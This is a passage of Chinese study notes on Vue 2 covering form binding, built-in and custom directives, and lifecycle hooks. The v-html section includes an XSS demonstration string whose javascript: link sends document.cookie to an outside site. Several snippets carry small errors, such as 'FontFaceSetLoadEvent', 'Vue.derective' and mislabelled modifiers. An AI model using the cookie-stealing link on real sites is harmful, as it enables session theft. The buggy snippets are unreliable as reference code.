                    hobby: ['抽烟', '喝酒', '烫头'],
                    friends: [
                        { name: 'jerry', age: 35 },
                        { name: 'tony', age: 36 }
                    ]
                }
            },
            methods: {
                addSex() {
                    // Vue.set(this.student,'sex','男')
                    this.$set(this.student, 'sex', '男')
                },
                addFriend() {
                    this.student.friends.unshift({ name: 'jack', age: 70 })
                },
                updateFirstFriendName() {
                    this.student.friends[0].name = '张三'
                },
                addHobby() {
                    this.student.hobby.push('学习')
                },
                updateHobby() {
                    // this.student.hobby.splice(0,1,'开车')
                    // Vue.set(this.student.hobby,0,'开车')
                    this.$set(this.student.hobby, 0, '开车')
                },
                removeSmoke() {
                    this.student.hobby = this.student.hobby.filter((h) => {
                        return h !== '抽烟'
                    })
                }
            }
        })
    </script>
```

### 八. 收集表单数据-过滤器

#### 1. 收集表单数据

- 若<input type="text"/>，则v-model收集的是value值，用户输入的内容就是value值
- 若<input type="radio"/>，则v-model收集的是value值，且要给标签配置value属性
- 若<input type="checkbox"/> 

   没有配置value属性，那么收集的是checked属性（勾选 or 未勾选，是布尔值）

   配置了value属性

​      ■ v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）

​      ■ v-model的初始值是数组，那么收集的就是value组成的数组

#### 2. v-model的三个修饰符

> `alazy`	失去焦点后再收集数据
>       `bnumber `  输入字符串转为有效的数字
>       `   ctrim`	输入首尾空格过滤

```html
<title>收集表单数据</title>
<script type="text/javascript" src="../js/vue.js"></script>

<div id="root">
    <form @submit.prevent="demo">
        账号：<input type="text" v-model.trim="userInfo.account"> <br /><br />
        密码：<input type="password" v-model="userInfo.password"> <br /><br />
        年龄：<input type="number" v-model.number="userInfo.age"> <br /><br />
        性别：
        男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
        女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br /><br />
        爱好：
        学习<input type="checkbox" v-model="userInfo.hobby" value="study">
        打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
        吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
        <br /><br />
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">成都</option>
        </select>
        <br/><br/>
        其他信息：
        <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
        <input type="checkbox" v-model="userInfo.agree">阅读并接受
        <a href="https://www.yuque.com/cessstudy">《用户协议》</a>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el: '#root',
        data: {
            userInfo: {
                account: '',
                password: '',
                age: 18,
                sex: 'female',
                hobby: [],
                city: 'beijing',
                other: '',
                agree: ''
            }
        },
        methods: {
            demo() {
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```

### 九. Vue的内置指令 和 自定义指令

#### 1. 内置指令：

> 常见的内置指令
>
> `v-model`	双向数据绑定
>       `v-for`		遍历数组 / 对象 / 字符串
>       `v-on`		绑定事件监听，可简写为@
>       `v-show`	条件渲染 (动态控制节点是否展示)
>       `v-if`		条件渲染（动态控制节点是否存存在）
>       `v-else-if`	条件渲染（动态控制节点是否存存在）
>       `v-else`	条件渲染（动态控制节点是否存存在）

1. ==v-text==**指令：**

    **作用**：向其所在的节点中渲染文本内容 
    与插值语法的区别：v-text会替换掉节点中的内容，{{xxx}}则不会，更灵活

    ```html
    <title>v-text指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    
    <div id="root">
        <div>你好，{{name}}</div>
        <div v-text="name"></div>
        <div v-text="str"></div>
    </div>
    
    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el:'#root',
            data:{
                name:'cess',
                str:'<h3>你好啊！</h3>'
            }
        })
    </script>
    ```

    

2. ==v-html== **指令**

    **作用**：向指定节点中渲染包含html结构的内容 
    与插值语法的区别： 
    ⅰv-html会替换掉节点中所有的内容，{{xxx}}则不会
    ⅱv-html可以识别html结构
    严重注意v-html有安全性问题！！！ 
    (1)在网站上动态渲染任意html是非常危险的，容易导致 XSS 攻击

    (2)一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！！！

    ```html
    <title>v-html指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    
    <div id="root">
        <div>你好，{{ name }}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    
    <script type="text/javascript">
        Vue.config.productionTip = FontFaceSetLoadEvent
        new Vue({
            el:'#root',
            data:{
                name:'cess',
                str:'<h3>你好啊！</h3>',
                str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
            }
        })
    </script>
    ```

    3. ==v-cloak== **指令** 

        （没有值）
        （1）本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
        （2）使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题

    ```html
        <title>v-cloak指令</title>
        
        <style>
        	// 设置所有带v-cloak标签的 不显示   
            [v-cloak] {
                display:none;
            }
        </style>
        
        <div id="root">
            <h2 v-cloak>{{ name }}</h2>
        </div>
        
        // 够延迟5秒收到vue.js
        <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
        
        <script type="text/javascript">
            console.log(1)
            Vue.config.productionTip = false
            new Vue({
                el:'#root',
                data:{name:'cess'}
            })
        </script>
    ```
    
     4. ==v-once==**指令**
    
        ● v-once所在节点在初次动态渲染后，就视为静态内容了 
        ● 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
    
        ```html
        <title>v-once指令</title>
        <script type="text/javascript" src="../js/vue.js"></script>
        
        <div id="root">
          <h2 v-once>初始化的n值是: {{n}}</h2>
          <h2>当前的n值是: {{n}}</h2>
          <button @click="n++">点我n+1</button>
        </div>
        
        <script type="text/javascript">
          Vue.config.productionTip = false
          new Vue({ el: '#root', data: {n:1} })
        </script>
        ```
    
        
    
     5. ==v-pre==**指令**
    
        （1）跳过v-pre所在节点的编译过程
        （2）可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

#### 2. 自定义指令

==directives 自定义指令==

1. 局部定义：

```html
<script>
    // 第一种写法
    new Vue({
        directives:{ 
            指令名:配置对象 
        }   
    })

    new Vue({															
        directives:{ 
            指令名:回调函数 
        }   
    })
</script>
```

2. 全局定义：

```javascript
Vue.directive(指令名, 配置对象)

Vue.directive(指令名, 回调函数)

Vue.derective('fbind',{
    // 指令与元素绑定成功时（一上来）
    bind(element,binding){
        element.value = binding.value;
    },
    // 指令所在元素被插入页面时
    inserted(element,binding) {
        element.focus(); //指定元素聚焦
    }，
    // 指令所在元素被重新解析时（被修改时）
    update(element,binding) {
    element.value = binding.value;
	}
})
```



**配置对象的3个回调函数：**

`bind(element,binding)`  	 指令与元素成功绑定时调用

`inserte(element,binding)`	指令所在元素被插入页面时调用

`update(elment,binding)`	  指令所在模板结构被重新解析时调用

​	**element就是DOM元素，binding就是要绑定的对象**，它包含以下属性：

​	name  value  old  Value  expression  arg  modifiers

> **备注**
> 		a. 指令定义时不加v-，但使用时要加v-
> 		b. 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名  





```html
<body>
    <div id="root">
        <h2>{{ name }}</h2>
        <hr>
        <h2>当前n值是： <span v-text="n"></span></h2>
        <h2>放大10倍后的值是：<span v-big="n"></span></h2>
        <button @click="n++">点我n+1 </button>
        <hr>
        <input type="text" v-fbind="n" value="1">
    </div>
</body>
<script>
    new Vue({
        el: '#root',
        data: {
            name: 'yanle',
            n: 1
        },
        directives: {
            // big何时被调用：
            // 1. 指令与元素成功绑定的时候（一上来）
            // 2. 指令所在的模板重新解析时 
            big(element, binding) {
                element.innerText = binding.value * 10;
            },
	
            fbind: {
                // 指令与元素成功绑定的时候 
                bind(element, binding) {
                    element.innerText = binding.value;
                },
                // 指令所在元素被插入到页面时候
                inserted(element,binding) {
                    element.focus();
                },
                // 指定元素的值被修改的时候
                update(element,binding) {
                    element.value = binding.value;
                }

            }
        }
    })
```

### 十. 生命周期

#### 1. 生命周期的基础概念：

==**生命周期**==

1. 又名`生命周期回调函数`、生命周期函数、生命周期钩子

2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数

3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的

4. 生命周期函数中的 this 指向是vm或组件实例对象

    ```html
    <title>引出生命周期</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    
    <div id="root">
        <h2 v-if="a">你好啊</h2>
        <h2 :style="{opacity}">看笔记学Vue</h2>
    </div>
    
    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                a: false,
                opacity: 1
            },
            methods: {
            },
            // 🔴Vue 完成模板的解析并把初始的真实 DOM 元素放入页面后（挂载完毕）调用 mounted
            mounted() {
                console.log('mounted', this)
                setInterval(() => {
                    this.opacity -= 0.01
                    if(this.opacity <= 0) this.opacity = 1
                }, 16)
            },
        })
    
        // 通过外部的定时器实现（不推荐）
        // setInterval(() => {
        // 		vm.opacity -= 0.01
        // 		if(vm.opacity <= 0) vm.opacity = 1
        // },16)
    </script>
    ```

    

![效果.gif](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202304112148105.gif)

#### 2. 分析生命周期：

![生命周期.png](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202304120053852.png)

#### 3. 生命周期代码示例：

```html
<body>
    <div id="root" :x="n">
        <h2 v-text="n"></h2>
        <h2>当前的n值是：{{ n }}</h2>
        <button @click="add">点我n+1</button>
        <button @click="bye">点我销毁vm</button>
    </div>
</body>
<script>
    const vm = new Vue({
        el: '#root',
        data: {
            n: 1
        },
        methods: {
            add(){
                this.n++;
            },
            bye(){
                this.$destroy()
            }
        },
        beforeCreate() {
            console.log('beforeCreate')
        },
        created() {
            console.log('created')
        },
        beforeMount() {
            console.log('beforeMount')
        },
        mounted() {
            console.log('mounted')
        },
        beforeUpdate() {
            console.log('beforeUpdate')
        },
        updated() {
            console.log('updated')
        },
        beforeDestroy() {
            console.log('beforeDestroy')
        },
        destroyed() {
            console.log('destroyed')
        },
    })
</script>
```

#### 4. 生命周期总结：

##### （1）常用的生命周期钩子：

- ==mounted==发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作

- ==beforeDestroy==清除定时器、解绑自定义事件、取消订阅消息等收尾工作 

##### （2）关于销毁Vue实例：

- 销毁后借助Vue开发者工具看不到任何信息
- 销毁后自定义事件会失效，但<u>原生DOM事件依然有效</u>
- 一般<u>不会在beforeDestroy操作数据</u>，因为即便操作数据，也不会再触发更新流程了
